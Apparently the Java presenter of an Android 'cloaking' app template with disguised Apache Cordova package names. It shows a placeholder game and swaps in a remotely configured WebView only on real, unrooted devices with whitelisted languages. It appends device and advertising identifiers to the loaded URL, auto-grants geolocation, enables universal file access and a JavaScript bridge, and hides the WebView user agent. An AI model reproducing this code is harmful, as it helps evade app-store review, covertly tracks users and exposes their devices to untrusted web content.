package org.apache.mvp.presenter;

import static com.android.lib.CustomTabsBroadcastReceiver.ACTION_COPY_URL;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.PendingIntent;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;
import android.webkit.CookieManager;
import android.webkit.GeolocationPermissions;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;

import androidx.activity.result.ActivityResultLauncher;
import androidx.annotation.Nullable;
import androidx.appcompat.UWView;
import androidx.appcompat.app.AlertDialog;

import org.apache.Utils;

import androidx.browser.customtabs.CustomTabColorSchemeParams;
import androidx.browser.customtabs.CustomTabsIntent;
import androidx.browser.trusted.TrustedWebActivityIntentBuilder;
import androidx.preference.PreferenceManager;

import com.android.lib.CustomTabsBroadcastReceiver;
import com.appsflyer.AppsFlyerLib;

import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
import com.google.android.gms.common.GooglePlayServicesRepairableException;
import com.google.androidbrowserhelper.trusted.TwaLauncher;
import com.walhalla.ui.DLog;

import org.apache.cordova.BuildConfig;
import org.apache.cordova.ChromeView;
import org.apache.cordova.Const;
import org.apache.cordova.GConfig;
import org.apache.cordova.R;
import org.apache.cordova.ScreenType;
import org.apache.cordova.TPreferences;
import org.apache.cordova.constants.TableField;
import org.apache.cordova.domen.BodyClass;
import org.apache.cordova.domen.Dataset;
import org.apache.cordova.enumer.UrlSaver;
import org.apache.cordova.repository.AbstractDatasetRepository;
import org.apache.cordova.repository.DatasetRepository;
import org.apache.cordova.repository.impl.FirebaseRepository;

import org.apache.cordova.v70.app.CustomWebViewClient;
import org.apache.cordova.v70.app.MyJavascriptInterface;
import org.apache.mvp.MainAdapter;
import org.apache.mvp.MainView;

import java.io.IOException;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.TimeZone;


//import com.google.android.gms.ads.identifier.AdvertisingIdClient;

public class MainPresenter extends BasePresenter
        implements SharedPreferences.OnSharedPreferenceChangeListener,
        DatasetRepository.RepoCallback {


    private final TPreferences pref;
    private final GConfig aaa;


    private final AbstractDatasetRepository repository;
    private final CustomTabsIntent customTabsIntent;
    private final SharedPreferences preferences;

    private String lUrl; //Saved tracker url

    //File Selector
    protected ActivityResultLauncher<Intent> requestSelectFileLauncher;
    protected ValueCallback<Uri> mUploadMessage;
    protected ValueCallback<Uri[]> uploadMessage;

    private final List<TwaLauncher> launchers = new ArrayList<>();
    public static final String LIST_DIVIDER = "\\|";
    public static final String NONENONE = "";
    private static final String TAG = "@@@";

    private final Activity context;
    private final MainView mView;

    private AlertDialog dialog; //demo mode dialog


    private boolean onlyOnetime = false;//resume method

    public MainPresenter
            (
                    MainView mainView,
                    Activity context,
                    GConfig aaa,
                    Handler handler,
                    @Nullable AbstractDatasetRepository repository
            ) {
        super(handler);

        this.mView = mainView;
        this.context = context;
        this.pref = TPreferences.getInstance(this.context);
        this.aaa = aaa;

        this.repository = repository;
        if (this.repository != null) {
            this.repository.setCallback(this);
        }
        if (!(UrlSaver.OH_NONE == aaa.SAVE_URL_LOCAL_TYPE)) {
            lUrl = pref.getTargetUrl();
        } else {
            lUrl = null;
        }
        this.customTabsIntent = customWeb(context);

        preferences = PreferenceManager.getDefaultSharedPreferences(context.getApplicationContext());
        preferences.registerOnSharedPreferenceChangeListener(this);
    }

    private CustomTabsIntent customWeb(Activity context) {
        //Configure the color of the address bar
        CustomTabColorSchemeParams defaultColors = new CustomTabColorSchemeParams.Builder()
                .setToolbarColor(context.getResources().getColor(R.color.colorPrimaryDark))
                //.setNavigationBarColor(getResources().getColor(R.color.colorPrimaryDark))
                .setNavigationBarDividerColor(Color.BLACK).setSecondaryToolbarColor(Color.BLACK).build();

        CustomTabsIntent.Builder builder = new CustomTabsIntent.Builder();
        builder
                //.setShowTitle(true)
                .setDefaultColorSchemeParams(defaultColors);

        //Configure a custom action button
        //24dp
        //@PandingIntent pandingIntent = new PendingI
        //@builder.setActionButton(icon, description, pendingIntent, tint);

        //Configure a custom menu
        //builder.addMenuItem(menuItemTitle, menuItemPendingIntent);

        //Android 12
        final int flag = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE : PendingIntent.FLAG_UPDATE_CURRENT;

        Intent intent = new Intent(context, CustomTabsBroadcastReceiver.class);
        intent.setAction(ACTION_COPY_URL);
        String label = "Copy link...";
        PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, intent, flag);

//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
//            //PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
//            pendingIntent = PendingIntent.getBroadcast(
//                    this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
//        } else {
//            //PendingIntent.FLAG_UPDATE_CURRENT
//            pendingIntent = PendingIntent.getBroadcast(
//                    this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
//        }
        builder.addMenuItem(label, pendingIntent).build();
//        FirebaseAnalytics mFirebaseAnalytics = FirebaseAnalytics.getInstance(context);
//        Bundle bundle = new Bundle();
//        bundle.putString("goz_ad_click", "1");
//        mFirebaseAnalytics.logEvent("in_offer_open_click", bundle);
        CustomTabsIntent customTabsIntent = builder.build();
        //customTabsIntent.intent.setPackage("com.android.chrome"); // Указываем пакет Chrome


        return customTabsIntent;
    }

    public static String makeUrl(String url, SharedPreferences preferences, Context context) {
        try {
            String language = Locale.getDefault().getLanguage().toLowerCase();

            String deepLink = preferences.getString(Const.KEY_DEEP_LINK, null);
            String client_id = preferences.getString(Const.key_pref_param_clid0, "");//new param

            boolean is_from_push = preferences.getBoolean(Const.PREF_KEY_IS_FROM_PUSH, false);

            String advertisingId = preferences.getString(Const.pref_advertisingId, null);

            @SuppressLint("HardwareIds") String android_id = Settings.Secure.getString(context.getContentResolver(),
                    Settings.Secure.ANDROID_ID);

            url = Utils.appendUri(url, "is_from_push=" + "" + is_from_push);
            url = Utils.appendUri(url, "time_zone=" + Utils.timeZone());
            url = Utils.appendUri(url, "lang=" + language);


            //new param
            if (!TextUtils.isEmpty(client_id)) {
                url = Utils.appendUri(url, "client_id=" + client_id);
            }

            url = Utils.appendUri(url, Const.param_advertisingId + "=" + advertisingId);


            url = Utils.appendUri(url, "app" + "=" + context.getPackageName());
            url = Utils.appendUri(url, "getz" + "=" + TimeZone.getDefault().getID());


            url = Utils.appendUri(url, Const.KEY_COUNTRY + "="
                    + Utils.getCountryCode(context));
            url = Utils.appendUri(url, "model=" + Utils.getBrand());
            url = Utils.appendUri(url, Const.KEY_BID + "=" + android_id);
            url = Utils.appendUri(url, Const.KEY_DEVICE + "=" + Utils.getBrand());
            url = Utils.appendUri(url, Const.KEY_DEVICE_MODEL + "=" + Utils.getDeviceModel());
            url = Utils.appendUri(url, "ifdevice" + "=" + "mobile");
            url = Utils.appendUri(url, "utm_campaign" + "=" + "DATING-1");//campaignid
            url = Utils.appendUri(url, "utm_content" + "=" + "google_play_dating"); //{creative}


            String qqq = "kwk_app";//context.getString(R.string.app_name);

            url = Utils.appendUri(url, Const.keyword + "=" + qqq);
            url = Utils.appendUri(url, Const.creative + "=" + qqq);
            url = Utils.appendUri(url, Const.campid + "=" + 1);
            url = Utils.appendUri(url, Const.adposition + "=" + 1);
            url = Utils.appendUri(url, Const.matchtype + "=" + 1);
            url = Utils.appendUri(url, Const.network + "=" + 1);
            url = Utils.appendUri(url, Const.placement + "=" + 1);
            url = Utils.appendUri(url, Const.target + "=" + 1);
            url = Utils.appendUri(url, Const.adid + "=" + 1);
            url = Utils.appendUri(url, Const.gclid + "=" + 1);
            url = Utils.appendUri(url, Const.zoneid + "=" + language);

            //url = Utils.appendUri(url, KEY_AF_ID + "=" + AppsFlyerLib.getInstance().getAppsFlyerUID(context));

            String apps_flyer_id = AppsFlyerLib.getInstance().getAppsFlyerUID(context);
            if (!TextUtils.isEmpty(apps_flyer_id)) {
                url = Utils.appendUri(url, "apps_flyer_id" + "=" + apps_flyer_id);
            }

            String ref = preferences.getString(Const.KEY_REFERRER_, null);


            //DLog.d("@@@@@@@@" + ref + "@@@@@@@@@"); //utm_source=google-play&utm_medium=organic

            if (ref != null) {
                //+ Небольшие правки {} - тип источника трафика (organic/facebook/...)
                ref = ref.replace("utm_source", "traffic_source");//var 2.0

                url = url + "&" + ref;
                url = Utils.appendUri(url, "getr" + "=" + "%22" + ref + "%22");
            } else {
                url = Utils.appendUri(url, "getr" + "=" + "%22" + ref + "%22");
            }

        } catch (URISyntaxException e) {
            e.printStackTrace();
            DLog.handleException(e);
        }
        //Log.d(TAG, "LOAD HTML DATA FROM --> " + url);
        return url;
    }

    public void init0(Context context) {
        dialog = new AlertDialog.Builder(context)
                .setTitle(R.string.app_name)
                .setMessage("UNPAID DEMO VERSION...")
                .setIcon(R.mipmap.ic_launcher)
                .setCancelable(true)
//                        .setNegativeButton("ОК, ...",
//                                new DialogInterface.OnClickListener() {
//                                    public void onClick(DialogInterface dialog, int id) {
//                                        dialog.cancel();
//                                    }
//                                });
                .create();
        adapter = new MainAdapter(context, preferences, mView);
    }

    protected MainAdapter adapter;

    @Override
    public void onSharedPreferenceChanged(SharedPreferences sharedPreferences, String key) {
        final Map<String, ?> keys = preferences.getAll();
        final Set<? extends Map.Entry<String, ?>> bbb = keys.entrySet();
        for (Map.Entry<String, ?> entry : bbb) {
            if (Const.KEY_ORGANIC_.equals(key)) {
                //Log.d(TAG, "ORGANIC_TRIGGER");
                //wrapContent0Request();
                return;
            } else if (Const.KEY_DEEP_LINK.equals(key)) {
                Log.d(TAG, "=========>>>>" + key + "::" + entry.getValue());
                if (mView.handleDeepLink()) {
                    mView.PEREHOD_S_DEEPLINKOM();
                }
                return;
            }
        }
    }

    public void onResume(Intent intent) {
        //DLog.d("@@@@@@@@@@@@@@@@" + aaa.ENABLE_TRACKER);
        if (!onlyOnetime) {
            if (aaa.ENABLE_TRACKER
                //&& !BuildConfig.DEBUG

            ) {
                if (!pref.noneFirst()) {
                    FirebaseRepository.enableActivityAutoTracking0(context);
                    pref.noneFirstEnable();
                } else {
                    Map<String, Object> map = new HashMap<>();
                    map.put(TableField.FIELD_UPDATE_AT, Utils.makeDate());
                    FirebaseRepository.update(context, map);
                }
            }
            onlyOnetime = true;


            //DLog.d("[==>>intent]" + intent.toString()+" "+intent.getAction());

            if (mView.handleDeepLink()) {
                String deepLink = preferences.getString(Const.KEY_DEEP_LINK, null);
                if (deepLink == null) {
                    String action = intent.getAction();

                    if ("android.intent.action.VIEW".equals(action)) {
                        Uri data = intent.getData();
                        if (data != null && data.isHierarchical()) {
                            String rawUrl = intent.getDataString();
                            if (!TextUtils.isEmpty(rawUrl)) {
                                preferences.edit().putString(Const.KEY_DEEP_LINK, rawUrl).apply();
                                //Send deep link data..
                                //PEREHOD_S_DEEPLINKOM();
                            } else {
                                wrapRequest();
                            }
                        }
                    } else {
                        wrapRequest();
                    }
                } else {
                    mView.PEREHOD_S_DEEPLINKOM();
                }
            } else {
                wrapRequest();
            }
        }
    }

    private void wrapRequest() {
        if (aaa.WRAP_ENABLED) {
            wrapContentRequest();
        }
    }

    public void wrapContentRequest() {


        //@@@   boolean organic = preferences.getBoolean(Config.KEY_ORGANIC, false);
        //@@@   if (organic) {
        //webOrGame(organic);


        //@@@ DLog.d(storage.checkLock(this) + "#" + organic);
        //@@@}


        //DLog.d("Emulator? " +  + " " + Build.MANUFACTURER + Build.MODEL);
        //Build.MANUFACTURER --> Google
        //Build.MODEL --> Pixel
        //DLog.d("[E] " +  + " " + Utils.isSimSupport(context));

        if (mView.checkDevice() != null) {
            if (mView.checkDevice().isCheckEmulator() && Utils.isProbablyAnEmulator()) {
                mView.hiDeRefreshLayout();
                return;
            }
            if (mView.checkDevice().isCheckRoot() && Utils.isDeviceRooted()) {
                mView.hiDeRefreshLayout();
                return;
            }
            // Проверка на подпись приложения
            if (mView.checkDevice().isPackageSignature() && !Utils.isAppSignatureValid(context)) {
                mView.hiDeRefreshLayout();
                return;
            }
        }

        //Local payload
        Dataset localDataset = mView.data();
        //DLog.d("LOCALE1" + storage.appWebDisabler(this) + " " + Build.MANUFACTURER + Build.MODEL);
        if (pref.appWebDisabler(context) || localDataset != null) {//show main screen
            DLog.d("<wd> " + pref.appWebDisabler(context));
            makeView(localDataset);
        } else {

            if (!mView.rotated()) {
                if (!(UrlSaver.OH_NONE == aaa.SAVE_URL_LOCAL_TYPE)) {
                    lUrl = pref.getTargetUrl();
                    //lUrl = "https://2ip.ru";
                    //DLog.d("@@@@@@@@@@@@" + lUrl);
                } else {
                    lUrl = null;
                }

                //Нет сохраненных URL
                if (TextUtils.isEmpty(lUrl)) {
                    DLog.d("cccc" + lUrl);
                    makeView(null); //null
                    // https://arbuztyt.xyz/
                    //"https://mazoksanusa.xyz"
                    //"https://indianpzdc.xyz/"
                    //final KwkRemoteRepository repository = new KwkRemoteRepository(new Handler(), "https://mazoksanusa.xyz", this, this);
                    //final KwkRemoteRepository repository = new KwkRemoteRepository(new Handler(),
                    // "https://indianpzdc.xyz/", this, this);
                    // final FirebaseRepository repo = new FirebaseRepository(this);
                    if (repository != null) {
                        repository.getConfig(context);
                    }
                } else {
                    DLog.d("sssscccc" + lUrl);
                    Dataset aa = new Dataset();
                    aa.url = lUrl;
                    aa.enabled = true;
                    determineAdvertisingInfo0(aa, context);
                }
            }
        }
        //none mView.wrapContentRequest();
    }

    private String advertId = null;

    public void determineAdvertisingInfo0(Dataset value, Activity context) {
        advertId = preferences.getString(Const.pref_advertisingId, null);
        if (!TextUtils.isEmpty(advertId)) {
            makeView(value);
            return;
        }
        executor.execute(() -> {
            //Background work here
            AdvertisingIdClient.Info idInfo = null;
            try {
                idInfo = AdvertisingIdClient.getAdvertisingIdInfo(context.getApplicationContext());
                if (idInfo != null) {
                    advertId = idInfo.getId();
                }
            } catch (GooglePlayServicesNotAvailableException e) {
                e.printStackTrace();
            } catch (GooglePlayServicesRepairableException e) {
                DLog.handleException(e);
            } catch (IOException e) {
                e.printStackTrace();
            }


            handler.post(() -> {
                //UI Thread work here
                pref.paramSetter(Const.pref_advertisingId, advertId);
                makeView(value);
            });
        });

//        if (AdvertisingIdClient.isAdvertisingIdProviderAvailable(this)) {
//            ListenableFuture<AdvertisingIdInfo> advertisingIdInfoListenableFuture =
//                    AdvertisingIdClient.getAdvertisingIdInfo(getApplicationContext());
//            Futures.addCallback(advertisingIdInfoListenableFuture,
//                    new FutureCallback<AdvertisingIdInfo>() {
//                        @Override
//                        public void onSuccess(AdvertisingIdInfo adInfo) {
//                            String id = adInfo.getId();
//                            String providerPackageName =
//                                    adInfo.getProviderPackageName();
//                            //boolean isLimitTrackingEnabled = adInfo.isLimitTrackingEnabled();
//                            DLog.d("@@@@" + id);
//                            preferences.edit()xaxax(Const.advertisingId, id).apply();
//                            presenter.makeView(value);
//                        }
//
//                        // Any exceptions thrown by getAdvertisingIdInfo()
//                        // cause this method to get called.
//                        @Override
//                        public void onFailure(@NotNull Throwable throwable) {
//                            Log.e("@@@", "Failed to connect to Advertising ID provider.");
//                            // Try to connect to the Advertising ID provider again,
//                            // or fall back to an ads solution that doesn't require
//                            // using the Advertising ID library.
//                            presenter.makeView(value);
//                        }
//                    }, Executors.newSingleThreadExecutor());
//        } else {
//            DLog.d("The Advertising ID client library is unavailable. Use a different");
//            // library to perform any required ads use cases.
//            presenter.makeView(value);
//        }

    }

    public void onDestroy() {
        preferences.unregisterOnSharedPreferenceChangeListener(null);
    }

    @SuppressLint("SourceLockedOrientationActivity")
    public void makeView(Dataset dataset) {

        //dataset.url="https://pin-up.ru/";
        DLog.d("**** " + dataset);
        String url = null;
        if (dataset != null) {
            if (dataset.isDemo()) {
                if (dialog != null && !dialog.isShowing()) {
                    dialog.show();
                }
                return;
            }
            if (dialog != null && dialog.isShowing()) {
                dialog.hide();
            }

            String language0 = Locale.getDefault().getLanguage();
//            DLog.d("@@@@@@@" + language0 + ", " + Locale.getDefault().getLanguage()
//                    + "_@@" + Locale.getDefault().getCountry() +
//                    "@@ [" + Locale.getDefault().getDisplayName() + "]");

//            if (Locale.getDefault().getCountry().contains("IN")) {
//                dataset.setEnabled(false);
//            }

            //test
//            for (Locale locale : Locale.getAvailableLocales()) {
////                if (locale.getCountry().contains("IN")) {
////                    Log.d("@@@", locale.getLanguage() + "_" + locale.getCountry() + " [" + locale.getDisplayName() + "]");
////                }
//
////                hi_ [Hindi]
////                hi_IN [Hindi (India)]
//                if (locale.getLanguage().equals("hi")) {
//                    Log.d("@@@", locale.getLanguage() + "_" + locale.getCountry() + " [" + locale.getDisplayName() + "]");
//                }
//            }

            if (dataset.isEnabled()) {

                if (TextUtils.isEmpty(dataset.getWhitelist())) {
                    url = dataset.getUrl();
                } else {
                    final String[] white = dataset.getWhitelist().split(LIST_DIVIDER);
//                    Log.d(TAG, "_Set_: " + dataset.getUrl() + " " + language0.toLowerCase() +
//                            "\t" + dataset.isEnabled() + Arrays.toString(white));

                    for (String d : white) {
                        if (language0.toLowerCase().contains(d)) {

                            int newOrientation = -1;

//                            if (dataset.portrait != null) {
//                                newOrientation = dataset.portrait
//                                        ? ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
//                                        : ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE;
//                            } else if (mView.orientationWeb() != null){
//                                newOrientation = mView.orientationWeb()
//                                        ? ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
//                                        : ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE;
//                            }
//                            if (newOrientation != null) {
//                                if (context.getRequestedOrientation() != newOrientation) {
//                                    context.setRequestedOrientation(mView.orientationWeb());
//                                }
//                            }

                            url = dataset.getUrl();

                            //Calendar calendar = Calendar.getInstance(TimeZone.getTimeZone("GMT"),Locale.getDefault());
                            //Date currentLocalTime = calendar.getTime();

                            //DateFormat date = new SimpleDateFormat("Z");
                            //String localTime = date.format(currentLocalTime);
//                        DateFormat date = new SimpleDateFormat("z", Locale.getDefault());
//                        String localTime = date.format(currentLocalTime);
                            break;
                        }
                    }
                }
                if (!TextUtils.isEmpty(url)) {
                    //url = makeUrl(url, preferences, context);
                }
            } else {
//                if(!dataset.enabled) {
//                    pref.setMute("true");
//                }
            }


            if (ScreenType.WEB_RAW == dataset.screenType) {
                mView.makeScreen(dataset);
            }
        }

        //Block one ore block 2
        DLog.d("**** @@@" + dataset + "@@" + url);

        if (TextUtils.isEmpty(url)) {
            if (dataset == null) {
                dataset = new Dataset();
            }
            dataset.screenType = ScreenType.GAME_VIEW;
            dataset.url = url;
            dataset.enabled = false;
            mView.makeScreen(dataset);
            //restart();
        } else {

            if (dataset == null) {
                dataset = new Dataset();
            }
            dataset.screenType = ScreenType.WEB_VIEW;
            dataset.url = url;
            mView.makeScreen(dataset);
            //launch(url);
        }
        DLog.d("**** " + dataset);
    }

    public void launchExternal(Context context, String url) {

        //Configure the color of the address bar
        CustomTabColorSchemeParams params = new CustomTabColorSchemeParams.Builder()
                .setToolbarColor(context.getResources().getColor(R.color.colorPrimaryDark))
                //.setNavigationBarColor(context.getResources().getColor(R.color.colorPrimaryDark))
                .build();
        TrustedWebActivityIntentBuilder toolbarColor = new TrustedWebActivityIntentBuilder(
                Uri.parse(url))
                .setDefaultColorSchemeParams(params);
        //.setNavigationBarColor(Color.WHITE) //deprecated
        //.setToolbarColor(Color.WHITE); //deprecated

        TwaLauncher twaLauncher = new TwaLauncher(context);
        twaLauncher.launch(toolbarColor,
                null,
                null,
                new Runnable() {
                    @Override
                    public void run() {
                        //completetionCallback
                    }
                }
        );
        this.launchers.add(twaLauncher);
    }

    protected void makeFileSelector21_x(UWView __mView) {
        __mView.setWebChromeClient(new WebChromeClient() {

            @Override
            public void onGeolocationPermissionsShowPrompt(String origin, GeolocationPermissions.Callback callback) {
                callback.invoke(origin, true, false);
            }

            // For 3.0+ Devices (Start)
            // onActivityResult attached before constructor
            private void openFileChooser(ValueCallback<Uri> uploadMsg, String acceptType) {
                __openFileChooser(uploadMsg, acceptType);
            }

            @Override
            public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, FileChooserParams fileChooserParams) {
                __onShowFileChooser(webView, filePathCallback, fileChooserParams);
                return true;
            }
        });
    }

    public void __openFileChooser(ValueCallback<Uri> uploadMsg, String acceptType) {
        mUploadMessage = uploadMsg;
        Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
        intent.addCategory(Intent.CATEGORY_OPENABLE);
        intent.setType("image/*");
        //startActivityForResult(Intent.createChooser(intent, "File Browser"), FILECHOOSER_RESULTCODE);
        requestSelectFileLauncher.launch(Intent.createChooser(intent, "File Browser"));
    }

    public void __onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, WebChromeClient.FileChooserParams fileChooserParams) {
        if (uploadMessage != null) {
            uploadMessage.onReceiveValue(null);
            uploadMessage = null;
        }
        uploadMessage = filePathCallback;
        Intent intent = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
            intent = fileChooserParams.createIntent();
        }
        try {
            requestSelectFileLauncher.launch(intent);
            // startActivityForResult(intent, REQUEST_SELECT_FILE);
        } catch (ActivityNotFoundException e) {
            uploadMessage = null;
            //return false;
        }
    }

    public void saveFirstPageIfValid(String url) {
        if (UrlSaver.FIRST_REDIRECT == aaa.SAVE_URL_LOCAL_TYPE) {
            if (lUrl == null && !TextUtils.isEmpty(url)) {
                lUrl = url;
                pref.setTargetUrl(url);
            }
        }
    }

    public void event(BodyClass event) {
        FirebaseRepository.event(context, event);
    }


    //Remote Repo Callback...
    @Override
    public void successResponse(Dataset value) {
        DLog.d("@@d@" + value.url + " " + value.enabled);
        if (aaa.SAVE_URL_LOCAL_TYPE == UrlSaver.FIRST) {
            pref.setTargetUrl(value.url);
        }
        determineAdvertisingInfo0(value, context);
    }

    @Override
    public void handleError(String m) {
        //Toast.makeText(this, "ERROR: " + m, Toast.LENGTH_LONG).show();
    }

    public void customTabsIntentLaunchUrl(String url) {
        try {
            customTabsIntent.launchUrl(context, Uri.parse(url));
        } catch (Exception e) {
            DLog.handleException(e);
        }
    }

    @SuppressLint({"SetJavaScriptEnabled", "ObsoleteSdkInt"})
    public void a123(ChromeView chromeView, UWView mView) {
        mView.getSettings().setSupportZoom(false);
        mView.getSettings().setDefaultTextEncodingName("utf-8");
        mView.getSettings().setLoadWithOverviewMode(true);
        mView.getSettings().getLoadsImagesAutomatically();
        mView.getSettings().setGeolocationEnabled(true);
        mView.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        mView.getSettings().setDomStorageEnabled(true);
        mView.getSettings().setBuiltInZoomControls(false);
        mView.getSettings().setJavaScriptEnabled(true);
        mView.getSettings().setPluginState(WebSettings.PluginState.ON);
        mView.getSettings().setAllowFileAccess(true);
        mView.getSettings().setAllowContentAccess(true);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
            mView.getSettings().setAllowFileAccessFromFileURLs(true);
            mView.getSettings().setAllowUniversalAccessFromFileURLs(true);
        }

        //"Mozilla/5.0 (Linux; Android 5.1.1; Nexus 7 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.78 Safari/537.36 OPR/30.0.1856.93524"
        //System.getProperty("http.agent")
        String tmp = mView.getSettings().getUserAgentString();
        mView.getSettings().setUserAgentString(tmp.replace("; wv)", ")"));

        if(BuildConfig.DEBUG){
            //mView.setBackgroundColor(Color.parseColor("#80000000"));
        }
        mView.setWebViewClient(new CustomWebViewClient(mView, chromeView, context));
        makeFileSelector21_x(mView);

        CookieManager.getInstance().setAcceptCookie(true);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            CookieManager.getInstance().setAcceptThirdPartyCookies(mView, true);
        }

//        __mView.addJavascriptInterface(
//                new MyJavascriptInterface(CompatActivity.this, __mView), "JSInterface");
        mView.addJavascriptInterface(new MyJavascriptInterface(mView.getContext(), mView), "Client");
    }
}
